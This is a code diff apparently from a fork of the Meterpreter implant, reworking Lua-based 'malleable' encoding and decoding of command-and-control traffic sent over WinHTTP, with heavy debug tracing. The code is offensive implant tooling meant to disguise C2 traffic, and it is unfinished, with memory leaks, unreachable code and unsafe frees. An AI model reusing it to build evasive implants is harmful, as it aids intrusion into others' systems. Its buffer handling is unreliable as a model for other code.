@@ -18,7 +18,7 @@ void bail(lua_State *L, char *msg){
 		msg, lua_tostring(L, -1));
 }
 
-char* malleableEncode(LPVOID buffer, DWORD* size)
+PUCHAR malleableEncode(LPVOID buffer, DWORD* size)
 {
 	dprintf("[MALLEABLE-ENCODE] Malleable encode start");
 	BOOL result = ERROR_SUCCESS;
@@ -46,13 +46,13 @@ char* malleableEncode(LPVOID buffer, DWORD* size)
 	if (result == ERROR_SUCCESS){
 		dprintf("[MALLEABLE-ENCODE] Starting buffer stuff");
 		dprintf("[MALLEABLE-ENCODE] Size: %i", size);
-		void *dest = malloc((size_t)size + 1); // i think need to free data mby +1 needs to go away 
+		//void *dest = malloc((size_t)size + 1); // i think need to free data mby +1 needs to go away 
 		//strcpy_s((const char*)data, (size_t)size, (char*) buffer); //mby manually null terminate
 		// this things is probalby terminating on null bytes, we dont wan't that we want to copy everything!
 
-		strncpy_s((char*)dest, (size_t)size + 1, (char*)buffer, (size_t)size - 1);
-		dprintf("[MALLEABLE-ENCODE] String address: %x", dest);
-		dprintf("[MALLEABLE-ENCODE] String: %s", dest);
+		//strncpy_s((char*)dest, (size_t)size + 1, (char*)buffer, (size_t)size - 1);
+		//dprintf("[MALLEABLE-ENCODE] String address: %x", dest);
+		//dprintf("[MALLEABLE-ENCODE] String: %s", dest);
 		//if (!strcmp(dest, ""))
 		//{
 		dprintf("[MALLEABLE-ENCODE] Encoding for transport.");
@@ -70,14 +70,27 @@ char* malleableEncode(LPVOID buffer, DWORD* size)
 		lua_getglobal(L, "encode");
 		dprintf("[MALLEABLE-ENCODE] LUA pushlstring");
 		size_t testSize = (size_t)*size;
+		
 		dprintf("[MALLEABLE-ENCODE] LUA pushlstring %s", lua_pushlstring(L, buffer, (size_t)testSize)); // casting without checking!
+		
 		dprintf("[MALLEABLE-ENCODE] lua_pcall() (encode)");
 		if (lua_pcall(L, 1, 1, 0))
 			bail(L, "lua_pcall() failed");
 		dprintf("[MALLEABLE-ENCODE] lua_pcall() (encode)");
 		size_t tmpLen = 1;
 		dprintf("[MALLEABLE-ENCODETTTTTTTTTTTTTTT] size: %i", tmpLen);
-		const char *encodedOut = luaL_tolstring(L, -1, &tmpLen);
+		const char* tmpResult = NULL;
+		tmpResult = luaL_tolstring(L, -1, &tmpLen);
+		PUCHAR encodedOut = NULL;
+		encodedOut = malloc(tmpLen);
+		if (encodedOut == NULL)
+		{
+			dprintf("[MALLEABLE-ENCODE] ERROR during malloc of encodedOut");
+			lua_close(L);
+			return NULL;
+		}
+		memcpy_s(encodedOut, tmpLen, tmpResult, tmpLen);
+		tmpResult = NULL;
 		dprintf("[MALLEABLE-ENCODE] TESTTESTTEST");
 		dprintf("[MALLEABLE-ENCODETTTTTTTTTTTTTTT] size: %i", tmpLen);
 		*size = (DWORD)tmpLen;
@@ -85,10 +98,11 @@ char* malleableEncode(LPVOID buffer, DWORD* size)
 		dprintf("[MALLEABLE-ENCODE] Got \"%s\" back from lua_tostring()", encodedOut);
 		dprintf("[MALLEABLE-ENCODE] Giving buffer(%x) address %x", encodedOut);
 		dprintf("[MALLEABLE-ENCODE] Still going strong");
-		SAFE_FREE(dest);
+		//SAFE_FREE(dest);
 		lua_close(L);
 		dprintf("[MALLEABLE-ENCODE] Still working");
-		return _strdup(encodedOut);
+		
+		return encodedOut;
 		//}
 	}
 
@@ -96,7 +110,7 @@ char* malleableEncode(LPVOID buffer, DWORD* size)
 	return NULL;
 }
 
-char* malleableDecode(LPVOID buffer, DWORD size)
+LPBYTE malleableDecode(LPVOID buffer, DWORD* size)
 {
 	dprintf("[MALLEABLE-DECODE] Malleable decode start");
 	BOOL result = ERROR_SUCCESS;
@@ -124,13 +138,14 @@ char* malleableDecode(LPVOID buffer, DWORD size)
 	if (result == ERROR_SUCCESS){
 		dprintf("[MALLEABLE-DECODE] Starting buffer stuff");
 		dprintf("[MALLEABLE-DECODE] Size: %i", size);
-		void *dest = malloc((size_t)size + 1); // i think need to free data mby +1 needs to go away 
+		size_t testSize = (size_t)*size;
+		//void *dest = malloc((size_t)size + 1); // i think need to free data mby +1 needs to go away 
 		//strcpy_s((const char*)data, (size_t)size, (char*) buffer); //mby manually null terminate
 		// this things is probalby terminating on null bytes, we dont wan't that we want to copy everything!
 
-		strncpy_s((char*)dest, (size_t)size + 1, (char*)buffer, (size_t)size - 1);
-		dprintf("[MALLEABLE-DECODE] String address: %x", dest);
-		dprintf("[MALLEABLE-DECODE] String: %s", dest);
+		//strncpy_s((char*)dest, (size_t)testSize + 1, (char*)buffer, (size_t)testSize - 1);
+		//dprintf("[MALLEABLE-DECODE] String address: %x", dest);
+		//dprintf("[MALLEABLE-DECODE] String: %s", dest);
 		//if (!strcmp(dest, ""))
 		//{
 		dprintf("[MALLEABLE-DECODE] Encoding for transport.");
@@ -147,18 +162,42 @@ char* malleableDecode(LPVOID buffer, DWORD size)
 		dprintf("[MALLEABLE-DECODE] LUA getglobal");
 		lua_getglobal(L, "decode");
 		dprintf("[MALLEABLE-DECODE] LUA pushlstring");
-		dprintf("[MALLEABLE-DECODE] LUA pushlstring %s", lua_pushlstring(L, buffer, (size_t)size)); // casting without checking!
+		dprintf("[MALLEABLE-DECODE] LUA pushlstring %s", lua_pushlstring(L, buffer, (size_t)testSize)); // casting without checking!
 		dprintf("[MALLEABLE-DECODE] lua_pcall() (decode)");
 		if (lua_pcall(L, 1, 1, 0))
 			bail(L, "lua_pcall() failed");
-		const char *decodedOut = lua_tostring(L, -1);
+		size_t tmpLen = 1;
+		const char* tmpResult = NULL;
+		tmpResult = luaL_tolstring(L, -1, &tmpLen);
+		LPBYTE decodedOut = NULL;
+		decodedOut = malloc(tmpLen);
+		memcpy_s(decodedOut, tmpLen, tmpResult, tmpLen);
+		tmpResult = NULL; // Am I loosing memory here? SAFE_FREE is crashing the Meterpreter
+		dprintf("[MALLEABLE-DECODE] 1 Length 1: %i", tmpLen);
+		*size = (DWORD)tmpLen;
 		dprintf("[MALLEABLE-DECODE] Got \"%s\" back from lua_tostring()", decodedOut);
 		dprintf("[MALLEABLE-DECODE] Giving buffer(%x) address %x", decodedOut);
 		dprintf("[MALLEABLE-DECODE] Still going strong");
-		SAFE_FREE(dest);
+		//SAFE_FREE(dest);
+		dprintf("[MALLEABLE-DECODE] 10");
 		lua_close(L);
-		dprintf("[MALLEABLE-DECODE] Still working");
-		return _strdup(decodedOut);
+		dprintf("[MALLEABLE-DECODE] 20");
+		SAFE_FREE(buffer);
+		dprintf("[MALLEABLE-DECODE] 30");
+		//buffer = malloc(tmpLen);
+		dprintf("[MALLEABLE-DECODE] 40");
+		//memset(buffer, 0, tmpLen);
+		dprintf("[MALLEABLE-DECODE] 42");
+		//memcpy_s(buffer, tmpLen, decodedOut, tmpLen);
+		dprintf("[MALLEABLE-DECODE] 50");
+
+		dprintf("[MALLEABLE-DECODE] DONE");
+		//return _strdup(decodedOut);
+		if (decodedOut == NULL)
+		{
+			dprintf("[MALLEABLE-DECODE] ERROR decodedOut == NULL");
+		}
+		return decodedOut;
 		//}
 	}
 
@@ -350,21 +389,36 @@ static BOOL read_response_winhttp_malleable(HANDLE hReq, LPVOID buffer, DWORD by
 static BOOL send_request_winhttp_malleable(HttpTransportContext* ctx, HANDLE hReq, LPVOID buffer, DWORD size)
 {
 	dprintf("[WINHTTP MALLEABLE] Starting sendrequest; size: %i. buffer: %s",size, buffer);
+	dprintf("[WINHTTP MALLEABLE] Buffer address begin: %x", buffer);
 	BOOL result;
+	
 	if (buffer != NULL)
 	{
+		LPVOID encodedBuffer = NULL;
 		// Create copy of buffer
-		LPVOID encodedBuffer = malleableEncode(buffer, &size);
+		encodedBuffer = malleableEncode(buffer, &size);
+		//malleableEncode(buffer, &size);
+		dprintf("[WINHTTP MALLEABLE] Buffer address end: %x", buffer);
+		return  WinHttpSendRequest(hReq, NULL, 0, buffer, size, size, 0);
 		dprintf("[WINHTTP MALLEABLE] Got size from malleableEncoded: size: %i", size);
 		if (encodedBuffer == NULL)
 		{
 			dprintf("[WINHTTP MALLEABLE] Error during malleableEncode, encodedBuffer == NULL !");
 			return FALSE;
 		}
-		SAFE_FREE(buffer);
-		buffer = encodedBuffer;
-		//size = (DWORD)strlen(encodedBuffer) + 1;
-		encodedBuffer = NULL;
+		//dprintf("[TIMOHELP] 799");
+		//SAFE_FREE(buffer);
+		dprintf("[TIMOHELP] 799.1");
+
+		buffer = realloc(encodedBuffer, size);
+		dprintf("[TIMOHELP] 800");
+		SAFE_FREE(encodedBuffer);
+		dprintf("[TIMOHELP] 801");
+		if (buffer == NULL)
+		{
+			dprintf("[WINHTTP MALLEABLE] Error during Buffer realloc");
+			return FALSE;
+		}
 	}
 	if (ctx->custom_headers)
 	{
@@ -658,9 +712,9 @@ static DWORD packet_receive_http_malleable(Remote *remote, Packet **packet)
 		goto out;
 	}
 	dprintf("[TIMOHELP] 320");
-	dprintf("[TIMOHELP] 321.0 Packetbuffer: %s", (PUCHAR)testPayload);
-	malleableDecode(testPayload, testCurrentPayloadSize);
-	dprintf("[TIMOHELP] 321.1 Packetbuffer: %s", (PUCHAR)testPayload);
+	dprintf("[TIMOHELP] 321.0 Packetbuffer. Size: %i; Buffer: %s", testCurrentPayloadSize, (PUCHAR)testPayload);
+	testPayload = malleableDecode(testPayload, &testCurrentPayloadSize);
+	dprintf("[TIMOHELP] 321.1 Packetbuffer. Size: %i; Buffer: %s", testCurrentPayloadSize, (PUCHAR)testPayload);
 	dprintf("[TIMOHELP] 322");
 
 	// Read the packet length
